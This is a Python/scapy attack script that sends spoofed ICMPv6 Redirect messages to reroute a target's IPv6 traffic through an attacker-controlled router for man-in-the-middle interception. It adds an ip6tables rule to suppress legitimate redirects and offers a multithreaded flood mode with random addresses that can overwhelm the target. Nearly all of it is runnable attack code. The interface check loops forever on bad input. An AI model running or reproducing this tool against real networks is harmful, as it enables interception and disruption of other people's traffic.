#!/usr/bin/python3
import argparse
import logging
import os
import random
import sys
import threading

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply, ICMPv6ND_Redirect, ICMPv6NDOptDstLLAddr, \
    ICMPv6NDOptRedirectedHdr, fragment6
from scapy.layers.l2 import Ether
from scapy.sendrecv import send, sendpfast

from validate_parameters import is_valid_ipv6, is_valid_mac, payload, mac2ipv6


def main():
    parser = argparse.ArgumentParser(description="|> Redirecting the route of a specified target to a destination. It "
                                                 "changes the traffic from getting through an existing hop to a new "
                                                 "hop. To perform this attack, two hosts need to be controlled by the "
                                                 "attacker (the sender - attacker, and the new router with its MAC "
                                                 "address). In the new router's host, it must allow forwarding "
                                                 "traffic to perform Man-in-the-middle.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-tip", dest="target_ip", action="store",
                        help="the IPv6 address of target.")
    parser.add_argument("-dip", dest="destination_ip", action="store",
                        help="the IPv6 address of the destination, to which the target plans to send packets.")
    parser.add_argument("-ort", dest="original_router", action="store",
                        help="the IPv6 address of the original router, which now forwards the packet from target to "
                             "destination.")
    parser.add_argument("-nrt", dest="new_router", action="store",
                        help="the IPv6 address of the new router, which attacker wants to forward the packet from "
                             "target to destination.")
    parser.add_argument("-rmac", dest="router_mac", action="store",
                        help="the MAC address of the new router.")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending Redirect messages using only the defined "
                             "new router's addresses (constant), or sending Redirect messages with many random "
                             "addresses of new router.")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Set number of errors to show all errors users face
    flag_error = 0

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        flag_error = 1
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            flag_error = 1

    # Validate the source IPv6 address
    if args.target_ip is None:
        print("---> IPv6 address of the target is required!!!")
        flag_error = 1
    if args.target_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            flag_error = 1

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        print("---> IPv6 address of the destination is required!!!")
        flag_error = 1
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            flag_error = 1

    # Validate the old router IPv6 address
    if args.original_router is None:
        print("---> IPv6 address of the original router is required!!!")
        flag_error = 1
    if args.original_router is not None:
        if not is_valid_ipv6(args.original_router):
            print("---> The given original router IPv6 address is invalid. Try again!!!")
            flag_error = 1

    # Validate the new router IPv6 address
    if args.new_router is None:
        print("---> IPv6 address of the new router is required!!!")
        flag_error = 1
    if args.new_router is not None:
        if not is_valid_ipv6(args.new_router):
            print("---> The given new router IPv6 address is invalid. Try again!!!")
            flag_error = 1

    # Validate the MAC address of the new router
    if args.router_mac is None:
        print("---> MAC address of the new router is required!!!")
        flag_error = 1
    if args.router_mac is not None:
        if not is_valid_mac(args.router_mac):
            print("---> The given MAC address of new router is invalid. Try again!!!")
            flag_error = 1

    if flag_error == 1:
        sys.exit(0)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    # Generate the packet
    data = payload(16)
    base_1 = IPv6()
    base_1.src = args.destination_ip
    base_1.dst = args.target_ip
    base_1.hlim = 255
    packet1 = base_1 / ICMPv6EchoRequest(data=data)

    base_2 = IPv6()
    base_2.src = args.target_ip
    base_2.dst = args.destination_ip
    base_2.hlim = 255
    packet2 = base_2 / ICMPv6EchoReply(data=data)

    # Generate Redirect, but we need two previous messages to succeed in attack
    base_3 = IPv6()
    base_3.src = args.original_router
    base_3.dst = args.target_ip
    base_3.hlim = 255

    packet3 = base_3 / ICMPv6ND_Redirect(tgt=args.new_router, dst=args.destination_ip) / ICMPv6NDOptDstLLAddr(
        lladdr=args.router_mac) / ICMPv6NDOptRedirectedHdr(pkt=packet2)
    if args.flood is None:
        command = 'ip6tables -A OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP'
        os.system(command)
        print("===> Dropping Redirect message to stop telling the victim to switch to real route.")
        print('     ip6tables -A OUTPUT -p icmpv6 --icmpv6-type redirect -j DROP')
        print("     After the attack, keep in mind to delete this rule for normal working!!!")
        send(packet3, verbose=False, iface=args.interface)
        print("===> Redirecting the traffic of the target: " + args.target_ip)
    if args.flood is not None:
        pkt_list = []
        print("Flooding the target: " + args.target_ip + " with Redirect messages (press Ctrl+C to stop the attack).....")
        if args.flood == "constant":
            packet3 = Ether(src=get_if_hwaddr(args.interface), dst="33:33:00:00:00:01") / base_3 / ICMPv6ND_Redirect(
                tgt=args.new_router, dst=args.destination_ip) / ICMPv6NDOptDstLLAddr(
                lladdr=args.router_mac) / ICMPv6NDOptRedirectedHdr(pkt=packet2)
            for i in range(200):
                pkt_list.append(packet3)
        if args.flood == "random":
            for i in range(150):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                new_router = mac2ipv6(random_mac)
                packet3 = Ether(src=get_if_hwaddr(args.interface),
                                dst="33:33:00:00:00:01") / base_3 / ICMPv6ND_Redirect(tgt=new_router,
                                                                                      dst=args.destination_ip) / ICMPv6NDOptDstLLAddr(
                    lladdr=random_mac) / ICMPv6NDOptRedirectedHdr(pkt=packet2)
                pkt_list.append(packet3)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, args.interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # If KeyboardInterrupt is raised in the main thread, stop all child threads
        threading.Event().set()
        sys.exit(0)
